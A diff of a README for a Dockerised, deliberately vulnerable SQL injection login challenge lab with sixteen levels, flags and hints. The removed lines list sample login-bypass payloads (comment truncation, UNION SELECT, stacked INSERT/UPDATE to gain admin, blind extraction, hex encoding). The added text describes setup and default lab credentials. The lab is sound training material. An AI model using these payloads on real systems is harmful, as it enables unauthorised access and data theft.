@@ -1,149 +1,136 @@
-# 🔒 SQL Injection Login Challenge Labs
+# SQL Injection Login Challenge Labs
 
-## Tổng quan
-Hệ thống này đã được chuyển đổi hoàn toàn thành **16 login form challenges** với mức độ khó tăng dần. Mỗi level là một form đăng nhập khác nhau với mục tiêu chung: **Đăng nhập với quyền admin bằng SQL injection**.
-
-## 🎯 Mục tiêu chính
-**Bypass authentication và login với role 'admin' trên mỗi level**
-
-## 📋 Danh sách các Level
-
-### **Level 1 - Basic Login** 🚨
-- **Loại**: Error-based SQL injection  
-- **Đặc điểm**: Hiển thị lỗi SQL, dễ nhất cho người mới
-- **Mục tiêu**: Login admin với basic injection
-- **Hint**: `admin'--` trong username field
-
-### **Level 2 - Union Login** 🔗  
-- **Loại**: UNION-based injection
-- **Đặc điểm**: Trích xuất dữ liệu từ nhiều bảng
-- **Mục tiêu**: Dùng UNION SELECT để login admin
-- **Hint**: `' UNION SELECT 1,'admin','admin'--`
-
-### **Level 3 - Stacked Query Login** ⚡
-- **Loại**: Multiple SQL statements
-- **Đặc điểm**: Cho phép thực thi nhiều lệnh SQL
-- **Mục tiêu**: Tạo tài khoản admin mới hoặc modify existing
-- **Hint**: `admin'; INSERT INTO users VALUES(99,'hacker','pass','admin');--`
-
-### **Level 4 - Blind Login** 🔍
-- **Loại**: Boolean-based blind injection
-- **Đặc điểm**: Không hiển thị lỗi, chỉ có TRUE/FALSE response
-- **Mục tiêu**: Trích xuất admin password qua blind techniques
-- **Hint**: Test từng ký tự của password admin
-
-### **Level 9 - Admin Portal** 🚪
-- **Loại**: Professional multi-layer security
-- **Đặc điểm**: 
-  - Input sanitization (removable quotes)
-  - Role-based access control
-  - Multiple validation layers
-  - Progressive hints system
-- **Mục tiêu**: Bypass tất cả security layers
-- **Hint**: Dùng hex encoding hoặc CHAR() function
-
-## 🚀 Cách sử dụng
-
-### 1. Khởi động Lab
-```bash
-cd "SQLi Lab"
-docker-compose up -d
-```
-
-### 2. Truy cập Web Interface
-- **URL**: http://localhost:8080
-- **Database**: MySQL 8.0 
-- **Tables**: users, levels, meta
-
-### 3. Progression đề xuất
-1. **Beginners**: Bắt đầu với Level 1, 2, 3
-2. **Intermediate**: Level 4, 9 
-3. **Advanced**: Các level còn lại (sẽ được tạo thêm)
-
-## 🎲 Sample Attack Vectors
-
-### Level 1 (Basic)
-```sql
-Username: admin'--
-Password: anything
-```
-
-### Level 2 (Union)
-```sql
-Username: ' UNION SELECT 1,'admin','password','admin'--  
-Password: password
-```
-
-### Level 3 (Stacked)
-```sql
-Username: test'; UPDATE users SET role='admin' WHERE username='test';--
-Password: test
-```
-
-### Level 4 (Blind)
-```sql
-# Extract admin password character by character
-Username: admin' AND ASCII(SUBSTR(password,1,1))>97--
-# Then login with extracted password
-```
-
-### Level 9 (Advanced)
-```sql
-Username: admin UNION SELECT 1,0x61646d696e,0x70617373,0x61646d696e--
-Password: anything
-```
-
-## 🏁 Success Criteria
-
-Mỗi level thành công sẽ hiển thị:
-- ✅ Thông báo thành công 
-- 🏁 **FLAG** unique cho level đó
-- 👤 Thông tin user admin đã login
-- 🎯 Điều kiện: `role = 'admin'`
-
-## 📊 Database Schema
-
-```sql
-users table:
-- id (INT)
-- username (VARCHAR)  
-- password (VARCHAR)
-- role (VARCHAR) -- 'admin', 'user', 'guest'
-```
-
-## 🛠️ Customization
-
-Để thêm level mới:
-1. Copy template từ level hiện có
-2. Modify vulnerability type
-3. Update index.php với level mới
-4. Thêm unique flag cho level
-
-## 🔧 Troubleshooting
-
-**Lỗi database connection:**
-```bash
-docker-compose down
-docker-compose up -d --build
-```
-
-**Reset database:**
-```bash
-docker-compose exec db mysql -u root -p sqli_lab < init.sql
-```
-
-## 🎯 Learning Outcomes
-
-Sau khi hoàn thành tất cả challenges, bạn sẽ master:
-- ✅ Error-based SQL injection
-- ✅ UNION-based data extraction  
-- ✅ Stacked queries manipulation
-- ✅ Blind injection techniques
-- ✅ Filter bypassing methods
-- ✅ Authentication bypass strategies
+This project contains a self‑hosted set of sixteen SQL injection login challenges that progress from beginner to final boss. Every level is a different authentication scenario whose end goal is the same: **obtain the administrator account by exploiting SQL injection**. The lab is designed for hands‑on practice inside an isolated environment and ships with a hint system, flag validation, and a consistent look and feel across all levels.
 
 ---
 
-**Happy Hacking! 🚀** 
+## 1. Project Structure
 
-*Nhớ chỉ sử dụng skills này cho mục đích học tập và ethical hacking!*
+```
+SQLi Lab/
+├── docker-compose.yml          # Web + database stack
+├── init.sql                    # Database schema and seed data
+├── index.php                   # Main challenge selector
+├── challenge_index.php         # Intro page for the standalone admin challenge
+├── includes/helpers.php        # Shared helpers (flags + hint renderer)
+├── level1.php ... level16.php  # Sixteen login challenges
+├── level7_set.php              # Setup step for the second-order challenge
+├── sandbox.php                 # Free-form query runner
+├── submit.php                  # Flag submission portal
+└── README_LOGIN_CHALLENGES.md  # This file
+```
+
+---
+
+## 2. Requirements
+
+- Docker & Docker Compose
+- Port **8080** available on the host
+
+---
+
+## 3. Getting Started
+
+```bash
+cd "SQLi Lab"
+docker compose up --build -d
+```
+
+The application will be reachable at <http://localhost:8080>. If you change anything inside `init.sql` or want to reset the environment, bring the stack down (with volumes) and start it again:
+
+```bash
+docker compose down -v
+docker compose up --build -d
+```
+
+---
+
+## 4. Database & Credentials
+
+The database is initialised by `init.sql` with a richer `users` table that contains the columns referenced by the challenges (email, phone, bio, etc.) and a `levels` table that stores the canonical flags.
+
+Two MySQL users are provisioned:
+
+| User         | Password   | Permissions                                      | Used by          |
+|--------------|------------|--------------------------------------------------|------------------|
+| `webapp`     | `webapp123`| CRUD on gameplay tables (`users`, `meta`, `logs`) | Level pages      |
+| `flagchecker`| `flagchecker123` | Read‑only access to `levels` table            | `submit.php`     |
+
+Environment variables in `docker-compose.yml` expose these credentials to the PHP container. If you need to change them, update both the compose file and `init.sql`, rebuild, and restart the services.
+
+---
+
+## 5. Level Overview
+
+| Level | Theme                               | Key Skill/Concept                              |
+|-------|--------------------------------------|------------------------------------------------|
+| 1     | Basic login                          | Error-based SQLi fundamentals                  |
+| 2     | Integer + UNION injection            | Column discovery & UNION exploitation          |
+| 3     | Stacked queries                      | Multi-statement execution & privilege escalation |
+| 4     | Boolean blind                        | True/false inference without errors            |
+| 5     | Time-based blind                     | Leveraging `SLEEP()` to extract data           |
+| 6     | File-based (OUTFILE)                 | Out-of-band exfiltration via filesystem        |
+| 7     | Second-order (setup + trigger)       | Persisted payloads executed on later request   |
+| 8     | Registration + stored payload        | Two-step injection through user data reuse     |
+| 9     | XPath authentication                 | XML/XPath predicate manipulation               |
+| 10    | INSERT injection                     | Tampering with `INSERT` to craft admin account |
+| 11    | UPDATE injection                     | Modifying an existing account’s role           |
+| 12    | JSON-based query                     | Injecting through JSON-parsed parameters       |
+| 13    | Comment filter bypass                | Evading stripped comment characters            |
+| 14    | Encoding filter bypass               | URL/HTML encoding combinations                 |
+| 15    | Whitespace-free injection            | Alternative whitespace & tokenisation          |
+| 16    | Advanced WAF (final boss)            | Combining multiple bypass strategies at once   |
+
+Each level page renders hints through the shared helper. You start with no guidance, and every click on “Show next hint” reveals a single additional clue, allowing you to pace yourself.
+
+---
+
+## 6. Flags & Validation
+
+- Every level displays the same canonical `FLAG{...}` string that is stored in the `levels` table and used by the submission portal.
+- Once you capture a flag, navigate to `/submit.php` or use the “Submit Flags” button on the home page.
+- Choosing the level and submitting the correct flag will mark it as complete via a browser cookie so you can track progress locally.
+
+> **Note:** The gameplay user (`webapp`) cannot read the `levels` table, so you must retrieve each flag through the intended exploit path.
+
+---
+
+## 7. Hint System
+
+Hints are declared in `includes/helpers.php`. They are:
+
+- Centralised so every page displays the same consistent copy.
+- Revealed incrementally to encourage exploration before giving the solution away.
+- Easy to extend; simply add or edit the array entry for the desired level.
+
+---
+
+## 8. Customising the Lab
+
+1. Duplicate an existing level file to use as a template.
+2. Adjust the vulnerability, layout, and success condition.
+3. Add the new level to `index.php` (and optionally `challenge_index.php` if relevant).
+4. Insert a new entry in `includes/helpers.php` for the flag and hints.
+5. Rebuild the containers so `init.sql` picks up the additional flag or seed data.
+
+---
+
+## 9. Troubleshooting
+
+| Issue                                 | Fix                                                                 |
+|---------------------------------------|----------------------------------------------------------------------|
+| Containers running but site unreachable | Confirm port 8080 is free; restart Docker or the containers.        |
+| DB connection errors                  | `docker compose down -v && docker compose up --build -d`             |
+| Flags not updating after changing `init.sql` | Drop volumes (`docker compose down -v`) before bringing the stack up |
+| Cookie state stale                    | Clear browser cookies for `localhost` or use a private window.      |
+| Need a free-form SQL playground       | Visit `/sandbox.php`; credentials default to the `webapp` user.      |
+
+---
+
+## 10. Safety Reminder
+
+These challenges are intentionally vulnerable and must only be used in this isolated environment. Do **not** reuse the sample credentials elsewhere and do not attempt these techniques against systems you do not explicitly own or have permission to test.
+
+---
+
+Happy hacking! Capture the flags, take notes as you go, and expand the lab with your own scenarios when you are ready.
